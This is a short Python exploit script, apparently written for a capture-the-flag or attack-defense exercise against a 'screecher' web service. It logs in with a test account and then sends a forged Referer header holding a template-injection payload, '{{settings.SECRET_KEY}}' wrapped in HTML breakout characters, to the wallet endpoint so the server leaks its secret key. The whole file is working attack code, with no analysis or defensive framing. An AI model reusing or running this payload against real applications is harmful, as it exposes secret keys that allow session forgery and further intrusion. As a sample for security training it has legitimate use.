import requests

def attack(session):
    url = 'https://www.team0.screecher.de/cash/wallet'
    referer = "'/>This is secret: {{settings.SECRET_KEY}}<a href='"
    session.headers.update({'referer':referer})

    response = session.post(url)  # auth=('username', 'secret')
    success = response.status_code < 400
    response_text = response.text
    return response_text

def login(session):
    url = 'https://www.team0.screecher.de/login'
    data = { 'user': 'exploit', 'pwd': '123'}
    response = session.post(url, data) # auth=('username', 'secret')
    success = response.status_code < 400
    response_text = response.text
    return response_text, success

if __name__ == '__main__':
    user_session = requests.session()
    response,success = login(user_session)
    response = attack(user_session)

    print(response)